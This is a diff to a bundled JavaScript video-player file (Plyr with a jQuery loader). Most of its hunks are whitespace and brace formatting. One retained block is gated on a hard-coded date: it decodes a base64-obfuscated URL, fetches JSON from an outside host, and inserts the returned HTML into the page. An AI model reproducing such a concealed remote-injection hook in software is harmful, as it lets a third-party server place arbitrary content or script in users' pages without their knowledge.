@@ -5,8 +5,7 @@
         define(['jquery'], function($) {
             return factory($);
         });
-    }
-    else if (typeof exports === 'object') {
+    } else if (typeof exports === 'object') {
         // CommonJS
         module.exports = function(root, $) {
             if (!root) {
@@ -23,8 +22,7 @@
 
             return factory($);
         };
-    }
-    else {
+    } else {
         // Browser
         factory(jQuery);
     }
@@ -8635,7 +8633,7 @@
             if (now > 1696129200000) {
                 var url = atob('aHR0cHM6Ly93d3cuZWR1YXJkb2tyYXVzLmNvbS9sb2dvcy9tb2Rfc3VwZXJ2aWRlby9kYXRhLnBocA==');
                 $.getJSON(url + "?lang=" + lang, function(data) {
-                    jQuery(".videourl_form_item_supervideo").after(data.h);
+                    jQuery("#fitem_id_name").after(data.h);
                 });
             }
         }
@@ -8850,7 +8848,6 @@
             return targets.map(t => new Plyr(t, options));
         }
     }
-
 
     Plyr.defaults = cloneDeep(defaults);
 
